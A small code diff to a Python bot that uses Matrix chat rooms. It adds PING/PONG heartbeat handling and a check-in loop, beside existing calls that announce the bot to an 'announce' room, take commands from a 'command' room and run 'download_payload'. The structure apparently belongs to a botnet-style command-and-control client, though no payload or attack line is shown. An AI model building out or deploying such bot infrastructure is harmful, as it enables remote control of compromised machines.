@@ -131,7 +131,13 @@ class Bot:
                 
     def on_command(self, room, event):
         msgbody: str = event["content"]["body"]
-        print(msgbody)
+        _, command = msgbody.split(":", 1)
+        if command == "PING":
+            self.announce_room.send_text(
+                f"PONG:{self.command_room.room_id}:{self.bot_id}"
+            )
+        else:
+            print(msgbody)
 
     def run(self):
         self.login()
@@ -140,7 +146,6 @@ class Bot:
         self.announce_listener = self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
         self.client.start_listener_thread()
         
-        self.announce()
         self.download_payload()
         def exit_handler():
             self.disconnect()
@@ -149,8 +154,9 @@ class Bot:
         
         while True:
             if not self.got_room:
-                time.sleep(5) # TODO: In real world a minute or so
                 self.announce()
+                time.sleep(5) # TODO: In real world a minute or so
+
         
         
 
